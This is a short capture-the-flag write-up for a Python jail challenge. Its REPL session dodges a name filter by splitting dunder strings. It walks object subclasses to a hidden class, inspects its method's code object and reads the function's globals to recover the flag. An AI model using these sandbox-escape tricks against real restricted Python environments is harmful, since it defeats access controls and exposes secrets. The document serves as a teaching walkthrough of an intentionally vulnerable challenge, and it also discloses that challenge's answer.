# WriteUp

```python
>>> getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()
[..., <class '__main__.Access'>, ...] 

>>> getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219]
<class '__main__.Access'>

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219], "_""_dict_""_")
mappingproxy({'__module__': '__main__', '__firstlineno__': 21, '__slots__': (), 'reveal': <function Access.reveal at 0x7e658ecbb880>, '__static_attributes__': (), '__doc__': None})

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_dir_""_")()
[..., '__code__', ...]

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_code_""_")
<code object reveal at 0x7e658edf4c60, file "/home/noman/./pyJail.py", line 23>

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_code_""_").co_consts
(None, 'Nope.')

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_code_""_").co_names
('FLAG',)

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_code_""_").co_code
b'\x95\x00U\x01[\x00\x00\x00\x00\x00\x00\x00\x00\x00:X\x00\x00a\x02\x00\x00U\x01$\x00S\x01$\x00'

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_glo""bals_""_")
{ ..., 'FLAG': 'BDSEC{w3lCom3_TO_PyJail}', ...}
```

```python
import dis

dis.dis(b'\x95\x00U\x01[\x00\x00\x00\x00\x00\x00\x00\x00\x00:X\x00\x00a\x02\x00\x00U\x01$\x00S\x01$\x00')
```